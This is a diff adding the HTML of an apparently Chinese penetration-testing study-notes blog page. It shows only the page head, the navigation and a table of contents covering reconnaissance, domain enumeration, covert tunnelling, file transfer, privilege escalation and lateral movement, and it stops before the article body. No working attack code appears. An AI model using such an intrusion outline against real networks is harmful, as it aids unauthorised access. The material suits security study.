@@ -1,0 +1,1086 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="菜鸡笔记 MetasploitPowerShell 在线 https:&#x2F;&#x2F;www.pstips.net&#x2F;powershell-online-tutorials 被动信息搜集whois1msf &gt; whois testfire.net  netcrafthttp:&#x2F;&#x2F;searchdns.netcraft.com nslook123nslook&gt; set type&#x3D;mx&gt; testf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="鮾魍肾透学习">
+<meta property="og:url" content="http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="歪比巴卜">
+<meta property="og:description" content="菜鸡笔记 MetasploitPowerShell 在线 https:&#x2F;&#x2F;www.pstips.net&#x2F;powershell-online-tutorials 被动信息搜集whois1msf &gt; whois testfire.net  netcrafthttp:&#x2F;&#x2F;searchdns.netcraft.com nslook123nslook&gt; set type&#x3D;mx&gt; testf">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-09-20T05:43:27.000Z">
+<meta property="article:modified_time" content="2021-10-31T03:46:32.139Z">
+<meta property="article:author" content="Du1L0v3">
+<meta property="article:tag" content="肾透">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>鮾魍肾透学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!--
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+-->
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post " href="/2021/09/20/%E8%AE%BA%E4%BB%8E%E9%AB%98%E6%A1%A3%E9%A4%90%E5%8E%85%E5%88%B0%E8%A1%97%E5%A4%B4%E5%B0%8F%E5%90%83%E7%9A%84%E5%A5%87%E5%A6%99%E4%B8%80%E6%99%9A/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/05/15/2021-CISCN-WEB-WP/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&text=鮾魍肾透学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&is_video=false&description=鮾魍肾透学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=鮾魍肾透学习&body=Check out this article: http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&title=鮾魍肾透学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&name=鮾魍肾透学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/09/20/%E9%AE%BE%E9%AD%8D%E8%82%BE%E9%80%8F%E5%AD%A6%E4%B9%A0/&t=鮾魍肾透学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit"><span class="toc-number">1.</span> <span class="toc-text">Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">被动信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whois"><span class="toc-number">1.1.1.</span> <span class="toc-text">whois</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netcraft"><span class="toc-number">1.1.2.</span> <span class="toc-text">netcraft</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nslook"><span class="toc-number">1.1.3.</span> <span class="toc-text">nslook</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#google-hacking"><span class="toc-number">1.1.4.</span> <span class="toc-text">google hacking</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">主动信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#tcp-%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">tcp 空闲扫描</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#postgresql"><span class="toc-number">1.2.2.</span> <span class="toc-text">postgresql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E5%90%88-postgresql-%E4%B8%8E-Nmap"><span class="toc-number">1.2.3.</span> <span class="toc-text">结合 postgresql 与 Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E6%80%A7%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">针对性扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B6%88%E6%81%AF%E5%9D%97%E5%8D%8F%E8%AE%AE%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">服务器消息块协议扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84-Microsoft-SQL-Server"><span class="toc-number">1.3.2.</span> <span class="toc-text">搜索配置不当的 Microsoft SQL Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">SSH 服务器扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.4.</span> <span class="toc-text">FTP 扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%BD%91%E7%AE%A1%E5%8D%8F%E8%AE%AE%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.5.</span> <span class="toc-text">简单网管协议扫描</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.1.2.</span> <span class="toc-text">常见杀毒软件进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WMIC-%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.3.</span> <span class="toc-text">WMIC 脚本自动收集信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-number">2.2.</span> <span class="toc-text">查询当前权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-number">2.3.</span> <span class="toc-text">判断是否存在域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.4.</span> <span class="toc-text">探测域内存活主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NetBIOS-%E5%BF%AB%E9%80%9F%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">2.4.1.</span> <span class="toc-text">NetBIOS 快速探测内网</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">参数说明</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ICMP-%E5%8D%8F%E8%AE%AE%E5%BF%AB%E9%80%9F%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">2.4.2.</span> <span class="toc-text">ICMP 协议快速探测内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ARP-%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">2.4.3.</span> <span class="toc-text">ARP 扫描探测内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84-TCP-UDP-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91"><span class="toc-number">2.4.4.</span> <span class="toc-text">常规 TCP&#x2F;UDP 端口扫描探测内网</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%9F%9F%E5%86%85%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.5.</span> <span class="toc-text">扫描域内端口</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-Banner-%E4%BF%A1%E6%81%AF"><span class="toc-number">2.5.1.</span> <span class="toc-text">端口 Banner 信息</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E8%AF%B4%E6%98%8E"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">常见端口及说明</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.6.</span> <span class="toc-text">收集域内基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">2.7.</span> <span class="toc-text">查找域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%8F%8A%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF"><span class="toc-number">2.8.</span> <span class="toc-text">获取域内用户及管理员信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">2.9.</span> <span class="toc-text">定位域管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.10.</span> <span class="toc-text">查找域管理进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">2.11.</span> <span class="toc-text">PowerShell 收集信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7-BloodHound"><span class="toc-number">2.12.</span> <span class="toc-text">域分析工具 BloodHound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E9%98%B2%E6%8A%A4"><span class="toc-number">2.13.</span> <span class="toc-text">敏感数据防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%84%E6%96%99%E3%80%81%E6%95%B0%E6%8D%AE%E3%80%81%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%9A%E4%BD%8D%E6%B5%81%E7%A8%8B"><span class="toc-number">2.13.1.</span> <span class="toc-text">资料、数据、文件的定位流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E7%82%B9%E6%A0%B8%E5%BF%83%E4%B8%9A%E5%8A%A1%E6%9C%BA%E5%99%A8%E5%8F%8A%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E9%98%B2%E6%8A%A4"><span class="toc-number">2.13.2.</span> <span class="toc-text">重点核心业务机器及敏感信息防护</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%B8%9A%E5%8A%A1%E6%9C%BA%E5%99%A8"><span class="toc-number">2.13.2.1.</span> <span class="toc-text">核心业务机器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">2.13.2.2.</span> <span class="toc-text">敏感信息和敏感文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E4%B8%8E%E6%96%87%E4%BB%B6%E5%BD%A2%E5%BC%8F%E4%BF%A1%E6%81%AF%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-number">2.13.3.</span> <span class="toc-text">应用与文件形式信息的防护</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%9F%9F%E5%86%85%E7%BD%91%E6%AE%B5%E5%88%92%E5%88%86%E6%83%85%E5%86%B5%E5%8F%8A%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84"><span class="toc-number">2.14.</span> <span class="toc-text">分析域内网段划分情况及拓扑结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84"><span class="toc-number">2.14.1.</span> <span class="toc-text">基本架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E7%BD%91%E6%AE%B5%E5%88%92%E5%88%86"><span class="toc-number">2.14.2.</span> <span class="toc-text">域内网段划分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text">隐藏通信隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%9A%A7%E9%81%93%E5%88%97%E4%B8%BE"><span class="toc-number">3.1.1.</span> <span class="toc-text">常用隧道列举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="toc-number">3.1.2.</span> <span class="toc-text">判断内网连通性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">网络层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPv6-%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.1.</span> <span class="toc-text">IPv6 隧道</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ICMP-%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.2.</span> <span class="toc-text">ICMP 隧道</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.3.</span> <span class="toc-text">传输层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lcx-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">3.3.1.</span> <span class="toc-text">lcx 端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netcat"><span class="toc-number">3.3.2.</span> <span class="toc-text">netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#nc-%E5%8F%82%E6%95%B0"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">nc 参数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerCat"><span class="toc-number">3.3.3.</span> <span class="toc-text">PowerCat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="toc-number">3.4.</span> <span class="toc-text">应用层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.4.1.</span> <span class="toc-text">SSH 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-HTTPS-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.4.2.</span> <span class="toc-text">HTTP&#x2F;HTTPS 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.4.3.</span> <span class="toc-text">DNS 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dnscat2"><span class="toc-number">3.4.3.1.</span> <span class="toc-text">dnscat2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#iodine"><span class="toc-number">3.4.3.2.</span> <span class="toc-text">iodine</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SOCKS-%E4%BB%A3%E7%90%86"><span class="toc-number">3.5.</span> <span class="toc-text">SOCKS 代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8-SOCKS-%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">3.5.1.</span> <span class="toc-text">常用 SOCKS 代理工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">3.5.2.</span> <span class="toc-text">应用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%92%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.6.</span> <span class="toc-text">上传和下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-FTP-%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.6.1.</span> <span class="toc-text">利用 FTP 协议上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-VBS-%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.6.2.</span> <span class="toc-text">利用 VBS 上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Debug-%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.6.3.</span> <span class="toc-text">利用 Debug 上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Nishang-bitsadmin-PowerShell-%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.6.4.</span> <span class="toc-text">利用 Nishang &#x2F; bitsadmin &#x2F; PowerShell 上传</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%88%86%E6%9E%90%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">权限提升分析防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">系统内核溢出漏洞提权分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%89%8B%E5%8A%A8%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8F%91%E7%8E%B0%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81"><span class="toc-number">4.1.1.</span> <span class="toc-text">通过手动执行命令发现缺失补丁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Metaspoit-%E5%8F%91%E7%8E%B0%E7%BC%BA%E5%A4%B1%E8%A1%A5%E4%B8%81"><span class="toc-number">4.1.2.</span> <span class="toc-text">利用 Metaspoit 发现缺失补丁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-Expoit-Suggester"><span class="toc-number">4.1.3.</span> <span class="toc-text">Windows Expoit Suggester</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PowerShell-%E7%9A%84-Sherlock-%E8%84%9A%E6%9C%AC"><span class="toc-number">4.1.4.</span> <span class="toc-text">PowerShell 的 Sherlock 脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">Windows 操作系统配置错误利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">4.2.1.</span> <span class="toc-text">系统服务权限配置错误</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%BF%99%E9%87%8C%E5%85%88%E9%B8%BD%E4%BA%86%EF%BC%8C%E5%B1%9E%E5%AE%9E%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E5%86%99"><span class="toc-number">4.3.</span> <span class="toc-text">提权这里先鸽了，属实不知道怎么写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">域内横向移动分析及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8-Windows-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%92%8C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">常用 Windows 远程连接和相关命令</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
